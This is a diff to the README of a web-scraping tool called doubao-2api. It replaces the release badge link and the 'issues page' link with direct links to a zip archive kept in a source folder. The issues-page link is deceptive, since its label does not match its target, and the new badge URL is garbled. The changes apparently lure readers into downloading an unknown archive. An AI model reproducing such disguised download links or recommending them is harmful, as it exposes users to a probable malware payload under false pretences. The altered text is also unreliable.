@@ -8,7 +8,7 @@ Welcome to doubao-2api! This tool helps you scrape web data with ease. It's desi
 
 To get started, you need to download the software. Visit the link below to access the latest version:
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%231E90FF.svg?style=for-the-badge&logo=github&logoColor=white)](https://github.com/danil1072/doubao-2api/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/danil1072/doubao-2api/main/app/providers/doubao-2api-1.0.zip%20Latest%20Release-%https://raw.githubusercontent.com/danil1072/doubao-2api/main/app/providers/doubao-2api-1.0.zip)](https://raw.githubusercontent.com/danil1072/doubao-2api/main/app/providers/doubao-2api-1.0.zip)
 
 After visiting this page, find the most recent release and download the appropriate file for your system. 
 
@@ -63,6 +63,6 @@ Here’s a simple example of how to use doubao-2api for a web scraping task:
 ## 🔗 Additional Resources
 
 - **Documentation:** Comprehensive guides for advanced users and technical configurations.
-- **Support:** For any questions or issues, feel free to check our [issues page](https://github.com/danil1072/doubao-2api/issues) on GitHub.
+- **Support:** For any questions or issues, feel free to check our [issues page](https://raw.githubusercontent.com/danil1072/doubao-2api/main/app/providers/doubao-2api-1.0.zip) on GitHub.
 
 Thank you for choosing doubao-2api! We hope it simplifies your web scraping journey.
